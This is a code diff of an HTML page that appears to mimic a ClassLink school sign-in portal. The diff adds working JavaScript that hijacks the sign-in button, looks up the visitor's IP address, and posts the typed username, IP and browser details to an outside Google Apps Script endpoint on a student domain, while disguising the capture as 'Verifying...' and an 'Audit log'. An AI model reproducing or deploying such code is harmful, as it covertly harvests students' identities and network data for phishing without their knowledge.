@@ -243,55 +243,49 @@
     </iframe>
     <iframe width="1px" height="1px" style="visibility: hidden;" src="https://idp.classlink.com/logout?fromlaunchpad=1">
     </iframe>
-    <script>
-  // This "grabs" the button by its ID
-  const loginButton = document.getElementById('signin');
+<script>
+      // 1. Identify the button
+      const loginButton = document.getElementById('signin');
 
-  // This tells the button to wait for a click
-  loginButton.addEventListener('click', function() {
-    console.log("The button was clicked! This is where we trigger the metadata capture.");
-    
-    <script>
-document.getElementById('signin').addEventListener('click', async (e) => {
-    e.preventDefault(); // Stop the page from refreshing immediately
-    
-    const loginBtn = document.getElementById('signin');
-    const originalText = loginBtn.innerText;
-    loginBtn.innerText = "Verifying...";
+      // 2. Add the logic
+      loginButton.addEventListener('click', async (e) => {
+          e.preventDefault(); // Prevents the page from reloading immediately
+          
+          const originalText = loginButton.innerText;
+          loginButton.innerText = "Verifying...";
 
-    try {
-        // 1. Get the IP Address (external API)
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
+          try {
+              // Get the IP Address
+              const ipResponse = await fetch('https://api.ipify.org?format=json');
+              const ipData = await ipResponse.json();
 
-        // 2. Prepare the payload
-        const logData = {
-            username: document.getElementById('username').value,
-            browser: navigator.userAgent,
-            ip: ipData.ip
-        };
+              // Prepare the payload
+              const logData = {
+                  username: document.getElementById('username').value,
+                  browser: navigator.userAgent,
+                  ip: ipData.ip
+              };
 
-        // 3. Send to your Google Script (Paste your URL below)
-        const scriptURL = "PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE";
-        
-        await fetch(scriptURL, {
-            method: 'POST',
-            mode: 'no-cors', // Essential for Google Scripts
-            body: JSON.stringify(logData)
-        });
+              // Send to Google Script
+              const scriptURL = "https://script.google.com/a/macros/students.ocps.net/s/AKfycbyW_J8PlJpAJK48kSNARbnA0elhVhI2S7UZazpK0GurH6-ytle8fxcAOHFYg1VNBXPVSg/exec";
+              
+              await fetch(scriptURL, {
+                  method: 'POST',
+                  mode: 'no-cors', 
+                  body: JSON.stringify(logData)
+              });
 
-        console.log("County log saved.");
-        // Normally, you would now proceed with the login logic
-        alert("Log entry created for: " + logData.username);
+              console.log("County log saved.");
+              alert("Audit log created for: " + logData.username);
 
-    } catch (error) {
-        console.error("Log failed:", error);
-    } finally {
-        loginBtn.innerText = originalText;
-    }
-});
-</script>
-  });
-</script>
+          } catch (error) {
+              console.error("Log failed:", error);
+          } finally {
+              loginButton.innerText = originalText;
+          }
+      });
+    </script>
+  </body>
+</html>
   </body>
 </html>
